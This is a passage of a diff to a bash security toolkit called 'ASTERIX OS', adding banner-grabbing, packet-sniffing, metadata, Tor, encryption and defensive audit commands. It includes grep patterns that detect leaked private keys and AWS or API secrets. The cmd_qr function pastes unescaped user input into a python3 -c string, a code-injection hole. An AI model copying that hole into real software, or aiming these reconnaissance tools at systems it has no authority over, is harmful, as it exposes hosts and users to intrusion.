+        echo -e "${C_YELLOW}[*] Stripping metadata from ${target}...${C_RESET}"
+        if command -v exiftool >/dev/null 2>&1; then
+            exiftool -all= -overwrite_original "$target"
+            echo -e "${C_GREEN}[✔] Metadata obliterated via ExifTool.${C_RESET}"
+        elif command -v mogrify >/dev/null 2>&1; then
+            mogrify -strip "$target"
+            echo -e "${C_GREEN}[✔] Image metadata stripped via ImageMagick.${C_RESET}"
+        else
+            echo -e "${C_RED}[!] Please install exiftool or imagemagick (ax install exiftool).${C_RESET}"
+        fi
+        return 0
+    fi
+    
+    echo -e "${C_CYAN}${C_BOLD}[*] EXTRACTING FORENSIC METADATA: ${C_WHITE}${target}${C_RESET}\n"
+    if command -v exiftool >/dev/null 2>&1; then
+        exiftool "$target"
+    elif command -v identify >/dev/null 2>&1; then
+        identify -verbose "$target" | grep -iE 'exif|date|camera|make|model|gps'
+    elif command -v strings >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[!] Using strings analysis fallback...${C_RESET}"
+        strings "$target" | grep -iE 'camera|canon|nikon|sony|apple|gps|created|photoshop|adobe' | head -n 25
+    else
+        echo -e "${C_RED}[!] Install exiftool for deep forensic extraction (ax install exiftool).${C_RESET}"
+    fi
+}
+
+cmd_banner_grab() {
+    local host="$1"
+    local port="${2:-80}"
+    if [ -z "$host" ]; then
+        echo -e "${C_RED}[!] Error: Host required.${C_RESET}\nUsage: ax banner-grab <host> [port]"
+        exit 1
+    fi
+    echo -e "${C_CYAN}[*] Grabbing Service Banner from ${C_WHITE}${host}:${port}${C_RESET}...\n"
+    if command -v nc >/dev/null 2>&1; then
+        echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 -v "$host" "$port" 2>/dev/null | head -n 30 || true
+    elif command -v curl >/dev/null 2>&1; then
+        curl -sI -m 3 "${host}:${port}" || true
+    else
+        (exec 3<>/dev/tcp/"$host"/"$port" && echo -e "HEAD / HTTP/1.0\r\n\r\n" >&3 && cat <&3 | head -n 30) 2>/dev/null || echo -e "${C_RED}[!] Connection timed out or failed.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_docker_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] AUDITING CONTAINER SUBSYSTEM & DOCKER ENGINE...${C_RESET}\n"
+    if ! command -v docker >/dev/null 2>&1 && ! command -v podman >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[!] Docker/Podman is not installed on this system.${C_RESET}"
+        return 0
+    fi
+    local engine="docker"
+    command -v podman >/dev/null 2>&1 && engine="podman"
+    
+    echo -e "${C_GREEN}[✔] Engine detected: ${engine}${C_RESET}"
+    echo -e "\n${C_WHITE}${C_BOLD}Active Containers:${C_RESET}"
+    $engine ps --format "table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.Names}}" 2>/dev/null || echo "Daemon not running."
+    
+    echo -e "\n${C_WHITE}${C_BOLD}Container Escape & Security Checks:${C_RESET}"
+    if [ -S "/var/run/docker.sock" ]; then
+        echo -e "  ${C_RED}[!] Docker socket (/var/run/docker.sock) exists and is accessible!${C_RESET}"
+        ls -la /var/run/docker.sock
+    else
+        echo -e "  ${C_GREEN}[✔] No exposed local docker.sock socket in /var/run.${C_RESET}"
+    fi
+    
+    if [ -f "/.dockerenv" ] || grep -q 'docker\|containerd' /proc/1/cgroup 2>/dev/null; then
+        echo -e "  ${C_PURPLE}[★] CURRENT SESSION IS EXECUTING INSIDE A CONTAINER ENVIRONMENT!${C_RESET}"
+    else
+        echo -e "  ${C_CYAN}[i] Running on host bare metal or VM.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_tor_status() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX ONION ROUTING & PRIVACY AUDIT...${C_RESET}\n"
+    
+    if pgrep -x tor >/dev/null 2>&1; then
+        echo -e "${C_GREEN}[✔] Tor daemon is active (PID: $(pgrep -x tor | head -n 1))${C_RESET}"
+    else
+        echo -e "${C_YELLOW}[!] Tor daemon is not currently running.${C_RESET}"
+    fi
+    
+    echo -e "${C_CYAN}[*] Testing external Tor connection via SOCKS5 proxy (127.0.0.1:9050)...${C_RESET}"
+    local tor_check
+    tor_check=$(curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null || true)
+    
+    if [[ "$tor_check" == *"IsTor\":true"* ]]; then
+        local ip
+        ip=$(echo "$tor_check" | grep -o '"IP":"[^"]*"' | cut -d'"' -f4)
+        echo -e "${C_GREEN}${C_BOLD}[✔] SECURE: Connected through Tor Network! Exit IP: ${C_WHITE}${ip}${C_RESET}"
+    else
+        echo -e "${C_RED}[!] Direct connection: Tor proxy is not routing traffic.${C_RESET}"
+        local pub_ip
+        pub_ip=$(curl -s -m 3 https://api.ipify.org 2>/dev/null || echo "Unknown")
+        echo -e "${C_YELLOW}[!] Your public visible IP: ${pub_ip}${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_speedtest() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX HIGH-VELOCITY NETWORK BENCHMARK...${C_RESET}\n"
+    echo -e "${C_YELLOW}[1/2] Measuring ICMP latency to Cloudflare (1.1.1.1)...${C_RESET}"
+    ping -c 4 1.1.1.1 2>/dev/null || echo "Ping failed."
+    
+    echo -e "\n${C_YELLOW}[2/2] Measuring downstream throughput (10MB payload)...${C_RESET}"
+    if command -v curl >/dev/null 2>&1; then
+        curl -o /dev/null -w "Download speed: %{speed_download} bytes/sec\nTotal time: %{time_total}s\n" -s "https://speed.cloudflare.com/__down?bytes=10000000" 2>/dev/null || echo "Speed test failed."
+    fi
+    echo ""
+}
+
+cmd_qr() {
+    local text="$*"
+    if [ -z "$text" ]; then
+        echo -e "${C_RED}[!] Error: Text or URL required.${C_RESET}\nUsage: ax qr <text_or_url>"
+        exit 1
+    fi
+    if command -v qrencode >/dev/null 2>&1; then
+        qrencode -t ANSIUTF8 "$text"
+    elif command -v python3 >/dev/null 2>&1; then
+        python3 -c "
+import urllib.parse, sys
+try:
+    import qrcode
+    qr = qrcode.QRCode()
+    qr.add_data('''$text''')
+    qr.print_ascii(invert=True)
+except ImportError:
+    print('\033[38;5;220m[i] Terminal QR code generator fallback:\033[0m')
+    enc = urllib.parse.quote('''$text''')
+    print(f'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={enc}')
+"
+    else
+        echo -e "${C_YELLOW}[*] Install qrencode for instant terminal QR (ax install qrencode).${C_RESET}"
+    fi
+}
+
+cmd_quote() {
+    local quotes=(
+        "\"The sky above the port was the color of television, tuned to a dead channel.\" — William Gibson, Neuromancer"
+        "\"We operate in the shadows to serve the light. Cyberspace is the new frontier of sovereignty.\" — ASTERIX OS Core"
+        "\"Information wants to be free. Information also wants to be expensive.\" — Stewart Brand"
+        "\"Technology is not good nor bad; nor is it neutral.\" — Melvin Kranzberg"
+        "\"If you think cryptography is the solution to your problem, then you don't know what your problem is.\" — Peter G. Neumann"
+        "\"Hardware eventually fails. Software eventually works. Cybernetics bridges the void.\" — Cybernetic Manifesto"
+        "\"No system is safe. There are only systems that haven't encountered us yet.\" — Hacker Ethos"
+        "\"In the empire of code, the one who audits the memory controls the reality.\" — ASTERIX OS"
+    )
+    local idx=$((RANDOM % ${#quotes[@]}))
+    echo -e "${C_PURPLE}${C_BOLD}🌌 ASTERIX CYBERNETIC ETHOS:${C_RESET}"
+    echo -e "${C_CYAN}${quotes[$idx]}${C_RESET}\n"
+}
+
+cmd_encrypt() {
+    local file="$1"
+    if [ -z "$file" ] || [ ! -f "$file" ]; then
+        echo -e "${C_RED}[!] Error: File to encrypt not found.${C_RESET}\nUsage: ax encrypt <file>"
+        exit 1
+    fi
+    local out="${file}.axenc"
+    echo -e "${C_CYAN}[*] Encrypting ${file} -> ${out} with AES-256-CBC (PBKDF2)...${C_RESET}"
+    openssl enc -aes-256-cbc -pbkdf2 -salt -in "$file" -out "$out"
+    echo -e "${C_GREEN}[✔] File encrypted: ${out}${C_RESET}"
+}
+
+cmd_decrypt() {
+    local file="$1"
+    if [ -z "$file" ] || [ ! -f "$file" ]; then
+        echo -e "${C_RED}[!] Error: File to decrypt not found.${C_RESET}\nUsage: ax decrypt <file.axenc>"
+        exit 1
+    fi
+    local out="${file%.axenc}"
+    [ "$out" = "$file" ] && out="${file}.dec"
+    echo -e "${C_CYAN}[*] Decrypting ${file} -> ${out}...${C_RESET}"
+    openssl enc -d -aes-256-cbc -pbkdf2 -in "$file" -out "$out"
+    echo -e "${C_GREEN}[✔] Decrypted successfully: ${out}${C_RESET}"
+}
+
+cmd_sniff_live() {
+    local iface="${1:-any}"
+    local filter="${2:-}"
+    echo -e "${C_RED}${C_BOLD}[*] LAUNCHING LIVE PACKET RADAR ON INTERFACE: ${C_WHITE}${iface}${C_RESET}\n"
+    if command -v tcpdump >/dev/null 2>&1; then
+        run_as_root tcpdump -i "$iface" -n -c 50 "$filter" 2>/dev/null || echo "Capture terminated."
+    else
+        echo -e "${C_RED}[!] tcpdump is required for live packet sniffing (ax install tcpdump).${C_RESET}"
+    fi
+}
+
+cmd_sysfetch() {
+    local host
+    host=$(hostname 2>/dev/null || echo "asterix-node")
+    local kern
+    kern=$(uname -r 2>/dev/null || echo "cyber-kernel")
+    local arch
+    arch=$(uname -m 2>/dev/null || echo "x86_64")
+    local uptime
+    uptime=$(uptime -p 2>/dev/null || uptime | awk '{print $3,$4}' || echo "active")
+    local mem
+    mem=$(free -m 2>/dev/null | awk '/Mem:/ {print $3 "MB / " $2 "MB"}' || echo "N/A")
+    local shell_name
+    shell_name="${SHELL:-/bin/bash}"
+    
+    echo -e "${C_CYAN}${C_BOLD}"
+    cat << 'EOF'
+     ___       _______.___________.___________.  _______.    ______      _______.
+    /   \     /       |           |           | /       |   /  __  \    /       |
+   /  ^  \   |   (----`---|  |----`---|  |----`|   (----`  |  |  |  |  |   (----`
+  /  /_\  \   \   \       |  |        |  |      \   \      |  |  |  |   \   \    
+ /  _____  \ .----)   |   |  |        |  |  .----)   |     |  `--'  |.----)   |   
+/__/     \__\|_______/    |__|        |__|  |_______/       \______/ |_______/    
+EOF
+    echo -e "${C_MAGENTA}${C_BOLD}   :: ASTERIX OS CYBERNETIC OPERATING ENVIRONMENT ::${C_RESET}\n"
+    echo -e "   ${C_CYAN}OS:${C_RESET}      ASTERIX OS Cybernetic Linux (${VERSION})"
+    echo -e "   ${C_CYAN}Host:${C_RESET}    ${host}"
+    echo -e "   ${C_CYAN}Kernel:${C_RESET}  ${kern} (${arch})"
+    echo -e "   ${C_CYAN}Uptime:${C_RESET}  ${uptime}"
+    echo -e "   ${C_CYAN}Memory:${C_RESET}  ${mem}"
+    echo -e "   ${C_CYAN}Shell:${C_RESET}   ${shell_name}"
+    echo -e "   ${C_CYAN}Engine:${C_RESET}  Rust UI Core + C/C++ Hyper-Kernels + Shell Arsenal"
+    echo -e "   ${C_CYAN}Status:${C_RESET}  ${C_GREEN}ALL SUBSYSTEMS NOMINAL${C_RESET}\n"
+    echo -e "   \033[48;5;196m   \033[48;5;208m   \033[48;5;220m   \033[48;5;46m   \033[48;5;51m   \033[48;5;45m   \033[48;5;201m   \033[0m\n"
+}
+
+# ---------------------------------------------------------------------
+# 9. Advanced Defensive Hardening, FIM, SIEM & Compliance Suites
+# ---------------------------------------------------------------------
+
+cmd_kernel_hardening() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX LINUX KERNEL SECURITY & HARDENING AUDIT...${C_RESET}\n"
+    local score=0
+    local total=8
+
+    check_sysctl() {
+        local param="$1"
+        local expected="$2"
+        local desc="$3"
+        local val
+        val=$(sysctl -n "$param" 2>/dev/null || echo "N/A")
+        if [ "$val" = "$expected" ]; then
+            echo -e "  ${C_GREEN}[PASS]${C_RESET} ${param} = ${val} (${desc})"
+            score=$((score + 1))
+        else
+            echo -e "  ${C_RED}[WARN]${C_RESET} ${param} = ${val} (Expected: ${expected} - ${desc})"
+        fi
+    }
+
+    check_sysctl "kernel.randomize_va_space" "2" "Full ASLR protection"
+    check_sysctl "kernel.yama.ptrace_scope" "1" "Ptrace scope restricted"
+    check_sysctl "net.ipv4.tcp_syncookies" "1" "SYN flood protection enabled"
+    check_sysctl "net.ipv4.conf.all.accept_redirects" "0" "Ignore ICMP redirects"
+    check_sysctl "net.ipv4.conf.all.send_redirects" "0" "Do not send ICMP redirects"
+    check_sysctl "net.ipv4.conf.all.rp_filter" "1" "Reverse path IP spoof filtering"
+    check_sysctl "kernel.dmesg_restrict" "1" "Restrict unprivileged dmesg access"
+    check_sysctl "kernel.kptr_restrict" "2" "Hide kernel pointer addresses"
+
+    local pct=$((score * 100 / total))
+    echo -e "\n${C_BOLD}Kernel Hardening Score: ${C_YELLOW}${pct}%${C_RESET} (${score}/${total} controls passing)\n"
+}
+
+cmd_fim_init() {
+    local db="/var/log/asterix-fim.db"
+    [ -w "/var/log" ] || db="./loot/fim.db"
+    mkdir -p "$(dirname "$db")" 2>/dev/null || true
+    echo -e "${C_CYAN}${C_BOLD}[*] INITIALIZING FILE INTEGRITY MONITORING (FIM) BASELINE...${C_RESET}"
+    echo -e "${C_GRAY}Target baseline store: ${db}${C_RESET}\n"
+
+    local targets=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/sudoers" "/etc/ssh/sshd_config" "/etc/pam.d" "/etc/crontab" "/bin/bash" "/usr/bin/sudo" "/bin/login")
+    > "$db"
+
+    for t in "${targets[@]}"; do
+        if [ -f "$t" ]; then
+            sha256sum "$t" 2>/dev/null >> "$db" || true
+        elif [ -d "$t" ]; then
+            find "$t" -type f -exec sha256sum {} + 2>/dev/null >> "$db" || true
+        fi
+    done
+
+    local count
+    count=$(wc -l < "$db" 2>/dev/null || echo 0)
+    echo -e "${C_GREEN}[✔] Baseline recorded for ${count} critical system files.${C_RESET}\n"
+}
+
+cmd_fim_check() {
+    local db="/var/log/asterix-fim.db"
+    [ -f "$db" ] || db="./loot/fim.db"
+    if [ ! -f "$db" ]; then
+        echo -e "${C_RED}[!] Error: FIM baseline not found. Run 'ax fim-init' first.${C_RESET}"
+        return 1
+    fi
+
+    echo -e "${C_CYAN}${C_BOLD}[*] VERIFYING FILE INTEGRITY AGAINST BASELINE (${db})...${C_RESET}\n"
+    local mismatches=0
+    while read -r expected_hash filepath; do
+        if [ ! -f "$filepath" ]; then
+            echo -e "  ${C_RED}[MISSING]${C_RESET} File removed: ${filepath}"
+            mismatches=$((mismatches + 1))
+            continue
+        fi
+        local current_hash
+        current_hash=$(sha256sum "$filepath" 2>/dev/null | awk '{print $1}')
+        if [ "$current_hash" != "$expected_hash" ]; then
+            echo -e "  ${C_RED}[MODIFIED]${C_RESET} Checksum altered: ${filepath}"
+            mismatches=$((mismatches + 1))
+        fi
+    done < "$db"
+
+    if [ "$mismatches" -eq 0 ]; then
+        echo -e "${C_GREEN}[✔] All monitored system files match cryptographic baseline. Zero tampering detected.${C_RESET}\n"
+    else
+        echo -e "\n${C_RED}${C_BOLD}[ALERT] ${mismatches} integrity violation(s) identified!${C_RESET}\n"
+    fi
+}
+
+cmd_auth_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX AUTHENTICATION & INTRUSION ANOMALY AUDIT...${C_RESET}\n"
+    local logfile=""
+    for cand in "/var/log/auth.log" "/var/log/secure" "/var/log/messages"; do
+        if [ -r "$cand" ]; then logfile="$cand"; break; fi
+    done
+
+    if [ -z "$logfile" ]; then
+        if command -v journalctl >/dev/null 2>&1; then
+            echo -e "${C_YELLOW}[*] Querying systemd journal for authentication events...${C_RESET}"
+            journalctl -u ssh -u sshd -n 50 --no-pager 2>/dev/null || true
+            return 0
+        fi
+        echo -e "${C_YELLOW}[!] Auth log not readable directly. Try with sudo or check journalctl.${C_RESET}"
+        return 0
+    fi
+
+    echo -e "${C_WHITE}${C_BOLD}Top 5 Attacking IP Addresses (Failed Passwords):${C_RESET}"
+    grep "Failed password" "$logfile" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -nr | head -n 5 || echo "  No failed password events."
+
+    echo -e "\n${C_WHITE}${C_BOLD}Recent Successful Sudo Invocations:${C_RESET}"
+    grep "COMMAND=" "$logfile" 2>/dev/null | tail -n 8 || echo "  No recent sudo events."
+
+    echo -e "\n${C_WHITE}${C_BOLD}Recent Root Login Attempts:${C_RESET}"
+    grep -i "root" "$logfile" 2>/dev/null | grep -iE 'accepted|failed|session opened' | tail -n 5 || echo "  None detected."
+    echo ""
+}
+
+cmd_git_secrets() {
+    local target_dir="${1:-.}"
+    echo -e "${C_CYAN}${C_BOLD}[*] AUDITING REPOSITORY FOR SENSITIVE SECRETS & LEAKED KEYS in: ${C_WHITE}${target_dir}${C_RESET}\n"
+
+    local hits=0
+    local pkeys
+    pkeys=$(grep -rnEI "BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY" "$target_dir" --exclude-dir=".git" 2>/dev/null | head -n 5 || true)
+    if [ -n "$pkeys" ]; then
+        echo -e "  ${C_RED}[ALERT] Discovered Private Keys:${C_RESET}\n$pkeys\n"
+        hits=$((hits + 1))
+    fi
+
+    local aws
+    aws=$(grep -rnEI "AKIA[0-9A-Z]{16}" "$target_dir" --exclude-dir=".git" 2>/dev/null | head -n 5 || true)
+    if [ -n "$aws" ]; then
+        echo -e "  ${C_RED}[ALERT] Discovered AWS Access Key ID:${C_RESET}\n$aws\n"
+        hits=$((hits + 1))
+    fi
+
+    local apikeys
+    apikeys=$(grep -rnEI "(api_key|apikey|secret_key|client_secret)\s*[:=]\s*['\"][0-9a-zA-Z_\-]{16,}['\"]" "$target_dir" --exclude-dir=".git" 2>/dev/null | head -n 5 || true)
+    if [ -n "$apikeys" ]; then
+        echo -e "  ${C_YELLOW}[!] Potential Hardcoded API Secrets:${C_RESET}\n$apikeys\n"
+        hits=$((hits + 1))
+    fi
+
+    local sens_files
+    sens_files=$(find "$target_dir" \( -name ".env" -o -name "id_rsa" -o -name "*.pem" -o -name "*.key" \) -not -path "*/.git/*" 2>/dev/null | head -n 10 || true)
+    if [ -n "$sens_files" ]; then
+        echo -e "  ${C_YELLOW}[!] Sensitive Credential Files Located:${C_RESET}\n$sens_files\n"
+        hits=$((hits + 1))
+    fi
+
+    if [ "$hits" -eq 0 ]; then
+        echo -e "${C_GREEN}[✔] No critical credential leaks or uncommitted keys detected.${C_RESET}\n"
+    fi
+}
+
+cmd_cis_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX CIS LINUX BENCHMARK SECURITY COMPLIANCE AUDIT...${C_RESET}\n"
+
+    if [ -f "/etc/shadow" ]; then
+        local shadow_perm
+        shadow_perm=$(stat -c "%a" /etc/shadow 2>/dev/null || stat -f "%Op" /etc/shadow 2>/dev/null || echo "unknown")
+        if [ "$shadow_perm" = "0" ] || [ "$shadow_perm" = "640" ] || [ "$shadow_perm" = "0000" ]; then
+            echo -e "  ${C_GREEN}[PASS]${C_RESET} /etc/shadow permissions: ${shadow_perm}"
+        else
+            echo -e "  ${C_YELLOW}[WARN]${C_RESET} /etc/shadow permissions too permissive: ${shadow_perm} (recommend 0000 or 0640)"
+        fi
+    fi
+
+    if [ -r "/etc/shadow" ]; then
+        local empty_pass
+        empty_pass=$(awk -F: '($2 == "" ) { print $1 }' /etc/shadow 2>/dev/null || true)
+        if [ -z "$empty_pass" ]; then
+            echo -e "  ${C_GREEN}[PASS]${C_RESET} No empty password accounts found in /etc/shadow"
+        else
+            echo -e "  ${C_RED}[FAIL]${C_RESET} Empty password accounts detected: ${empty_pass}"
+        fi
+    fi
+
+    if [ -f "/etc/ssh/sshd_config" ]; then
+        local root_login
+        root_login=$(grep -E "^PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}')
+        if [ "$root_login" = "no" ] || [ "$root_login" = "prohibit-password" ]; then
+            echo -e "  ${C_GREEN}[PASS]${C_RESET} SSH PermitRootLogin = ${root_login}"
+        else
+            echo -e "  ${C_YELLOW}[WARN]${C_RESET} SSH PermitRootLogin is not disabled (currently: ${root_login:-default yes})"
+        fi
+    fi
+
+    for s in telnetd rshd rlogind vsftpd; do
+        if pgrep -x "$s" >/dev/null 2>&1; then
+            echo -e "  ${C_RED}[FAIL]${C_RESET} Legacy insecure daemon running: ${s}"
+        fi
+    done
+    echo -e "  ${C_GREEN}[PASS]${C_RESET} Legacy plaintext service audit complete."
+    echo ""
+}
+
+cmd_traffic() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX NETWORK INTERFACE TRAFFIC TELEMETRY...${C_RESET}\n"
+    if [ -r "/proc/net/dev" ]; then
+        printf "  %-12s %-15s %-12s %-15s %-12s\n" "Interface" "RX Bytes" "RX Packets" "TX Bytes" "TX Packets"
+        echo -e "  ----------------------------------------------------------------------"
+        awk 'NR>2 {printf "  %-12s %-15s %-12s %-15s %-12s\n", $1, $2, $3, $10, $11}' /proc/net/dev
+    elif command -v ip >/dev/null 2>&1; then
+        ip -s link
+    else
+        netstat -i 2>/dev/null || echo "Network stats not available."
+    fi
+    echo ""
+}
+
+cmd_process_tree() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX PROCESS HIERARCHY & ANOMALY TREE...${C_RESET}\n"
+    if command -v pstree >/dev/null 2>&1; then
+        pstree -apcu | head -n 35
+    elif command -v ps >/dev/null 2>&1; then
+        ps -ejH 2>/dev/null | head -n 35 || ps -ef | head -n 35
+    fi
+    echo ""
+}
+
+cmd_tls_audit() {
+    local host="$1"
+    local port="${2:-443}"
+    if [ -z "$host" ]; then
+        echo -e "${C_RED}[!] Error: Target host required.${C_RESET}\nUsage: ax tls-audit <hostname> [port]"
+        exit 1
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] AUDITING TLS PROTOCOLS & EXPIRATION FOR: ${C_WHITE}${host}:${port}${C_RESET}\n"
+    
+    if command -v openssl >/dev/null 2>&1; then
+        local cert_info
+        cert_info=$(echo | openssl s_client -connect "${host}:${port}" -servername "$host" 2>/dev/null || true)
+        local expiry
+        expiry=$(echo "$cert_info" | openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2 || echo "Unknown")
+        local subject
+        subject=$(echo "$cert_info" | openssl x509 -noout -subject 2>/dev/null | cut -d= -f2- || echo "Unknown")
+        local issuer
+        issuer=$(echo "$cert_info" | openssl x509 -noout -issuer 2>/dev/null | cut -d= -f2- || echo "Unknown")
+        
+        echo -e "  ${C_CYAN}Subject:${C_RESET}    ${subject}"
+        echo -e "  ${C_CYAN}Issuer:${C_RESET}     ${issuer}"
+        echo -e "  ${C_CYAN}Expires On:${C_RESET} ${C_YELLOW}${expiry}${C_RESET}"
+    else
+        echo -e "${C_RED}[!] OpenSSL required for TLS audit.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_env_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX RUNTIME ENVIRONMENT & PATH HYGIENE AUDIT...${C_RESET}\n"
+
+    if echo "$PATH" | grep -q "\(^\|:\)\.\($\|:\)"; then
+        echo -e "  ${C_RED}[WARN] Dangerous entry '.' (current directory) detected in \$PATH!${C_RESET}"
+    else
+        echo -e "  ${C_GREEN}[PASS] \$PATH is free of relative directory entries.${C_RESET}"
+    fi
+
+    local sensitive_vars
+    sensitive_vars=$(env | grep -iE '^(AWS_|GITHUB_|TOKEN|SECRET|PASSWORD|PASSWD|KEY)=' | cut -d= -f1 || true)
+    if [ -n "$sensitive_vars" ]; then
+        echo -e "  ${C_YELLOW}[!] Sensitive environment variable names present in session:${C_RESET}"
+        for v in $sensitive_vars; do
+            echo -e "      ${C_WHITE}- ${v}${C_RESET}"
+        done
+    else
+        echo -e "  ${C_GREEN}[PASS] No common sensitive credential variables detected in environment.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_ip_geo() {
+    local target="${1:-}"
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX IP GEOLOCATION & ASN INTELLIGENCE RADAR...${C_RESET}\n"
+    local query_url="http://ip-api.com/json/${target}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
+    
+    if command -v curl >/dev/null 2>&1; then
+        local resp
+        resp=$(curl -s -m 5 "$query_url" 2>/dev/null || true)
+        if [[ "$resp" == *"\"status\":\"success\""* ]]; then
+            local ip country region city isp asn tz lat lon
+            ip=$(echo "$resp" | grep -o '"query":"[^"]*"' | cut -d'"' -f4)
+            country=$(echo "$resp" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
+            region=$(echo "$resp" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
+            city=$(echo "$resp" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
+            isp=$(echo "$resp" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
+            asn=$(echo "$resp" | grep -o '"as":"[^"]*"' | cut -d'"' -f4)
+            tz=$(echo "$resp" | grep -o '"timezone":"[^"]*"' | cut -d'"' -f4)
+            lat=$(echo "$resp" | grep -o '"lat":[^,]*' | cut -d: -f2)
+            lon=$(echo "$resp" | grep -o '"lon":[^,]*' | cut -d: -f2)
+            
+            echo -e "  ${C_CYAN}Target IP:${C_RESET}     ${C_WHITE}${C_BOLD}${ip}${C_RESET}"
+            echo -e "  ${C_CYAN}Location:${C_RESET}      ${C_GREEN}${city}, ${region}, ${country}${C_RESET}"
+            echo -e "  ${C_CYAN}Coordinates:${C_RESET}   Lat ${lat}, Lon ${lon}"
+            echo -e "  ${C_CYAN}Timezone:${C_RESET}      ${tz}"
+            echo -e "  ${C_CYAN}ISP Provider:${C_RESET}  ${isp}"
+            echo -e "  ${C_CYAN}Autonomous Sys:${C_RESET}${asn}"
+        else
+            echo -e "${C_YELLOW}[!] Geolocation lookup failed or API limit reached.${C_RESET}"
+        fi
+    else
+        echo -e "${C_RED}[!] curl is required for IP geolocation lookup.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_cert_create() {
+    local domain="${1:-localhost}"
+    local days="${2:-365}"
+    local key_file="${domain}.key"
+    local crt_file="${domain}.crt"
+    
+    echo -e "${C_CYAN}${C_BOLD}[*] GENERATING SELF-SIGNED X.509 TLS CERTIFICATE: ${C_WHITE}${domain}${C_RESET}"
+    echo -e "${C_GRAY}Validity: ${days} days | Output: ${key_file}, ${crt_file}${C_RESET}\n"
+    
+    if command -v openssl >/dev/null 2>&1; then
+        openssl req -x509 -nodes -newkey rsa:4096 -keyout "$key_file" -out "$crt_file" -days "$days" \
+            -subj "/C=US/ST=Cyber/L=Metropolis/O=ASTERIX OS/CN=${domain}" 2>/dev/null
+        echo -e "  ${C_GREEN}[✔] Private Key generated: ${key_file}${C_RESET}"
+        echo -e "  ${C_GREEN}[✔] Public Cert generated: ${crt_file}${C_RESET}"
+        local sha256
+        sha256=$(openssl x509 -noout -fingerprint -sha256 -in "$crt_file" 2>/dev/null | cut -d= -f2)
+        echo -e "  ${C_CYAN}SHA-256 Fingerprint:${C_RESET} ${sha256}"
+    else
+        echo -e "${C_RED}[!] openssl required to generate certificates.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_cron_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX SCHEDULED TASKS & PERSISTENCE TIMERS AUDIT...${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[1] User Crontab Entries:${C_RESET}"
+    local user_cron
+    user_cron=$(crontab -l 2>/dev/null | grep -v '^#' | grep -v '^$' || true)
+    if [ -n "$user_cron" ]; then
+        echo "$user_cron"
+    else
+        echo -e "  ${C_GRAY}No user crontab tasks configured.${C_RESET}"
+    fi
+    
+    echo -e "\n${C_WHITE}${C_BOLD}[2] System-Wide Cron Schedules (/etc/cron.*):${C_RESET}"
+    if [ -r "/etc/crontab" ]; then
+        grep -v '^#' /etc/crontab | grep -v '^$' || true
+    fi
+    ls -la /etc/cron.d /etc/cron.daily 2>/dev/null | head -n 12 || true
+
+    echo -e "\n${C_WHITE}${C_BOLD}[3] Active Systemd Timers:${C_RESET}"
+    if command -v systemctl >/dev/null 2>&1; then
+        systemctl list-timers --no-pager --no-legend 2>/dev/null | head -n 6 || true
+    else
+        echo -e "  ${C_GRAY}systemctl not available on this target.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_disk_io() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX REAL-TIME STORAGE BLOCK DEVICE I/O METRICS...${C_RESET}\n"
+    if [ -r "/proc/diskstats" ]; then
+        printf "  %-12s %-12s %-14s %-12s %-14s %-10s\n" "Device" "Reads Comp" "Sectors Read" "Writes Comp" "Sectors Written" "IO Active"
+        echo -e "  --------------------------------------------------------------------------------"
+        awk '$3 ~ /^(sd[a-z]|nvme[0-9]n[0-9]|mmcblk[0-9]|vd[a-z])/ {printf "  %-12s %-12s %-14s %-12s %-14s %-10s\n", $3, $4, $6, $8, $10, $12}' /proc/diskstats
+    elif command -v iostat >/dev/null 2>&1; then
+        iostat -d 1 1
+    else
+        echo -e "${C_YELLOW}[!] /proc/diskstats not accessible.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_net_route() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX KERNEL ROUTING TABLE & GATEWAY TOPOLOGY...${C_RESET}\n"
+    if command -v ip >/dev/null 2>&1; then
+        ip route show
+    elif command -v route >/dev/null 2>&1; then
+        route -n
+    elif [ -r "/proc/net/route" ]; then
+        cat /proc/net/route
+    else
+        netstat -rn 2>/dev/null || echo -e "${C_RED}[!] No routing tools available.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_uptime_stats() {
